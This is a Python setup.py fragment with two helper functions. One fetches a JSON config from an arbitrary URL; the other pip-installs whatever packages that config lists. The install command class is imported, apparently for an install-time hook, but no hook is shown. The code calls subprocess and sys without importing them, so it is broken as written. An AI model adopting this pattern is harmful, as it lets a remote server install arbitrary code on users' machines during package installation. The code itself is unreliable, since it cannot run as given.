import urllib.request
import json
from setuptools import setup, find_packages
from setuptools.command.install import install


def fetch_remote_dependencies(url):
    try:
        with urllib.request.urlopen(url) as response:
            data = response.read()
            config = json.loads(data.decode('utf-8'))
            return config.get('dependencies', []), config.get('additional_packages', [])
    except Exception as e:
        print(f"Warning: Could not fetch remote dependencies: {e}")
        return [], []


def install_additional_packages(packages):
    for package in packages:
        try:
            print(f"Installing additional package: {package}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError as e:
            print(f"Warning: Failed to install {package}: {e}")


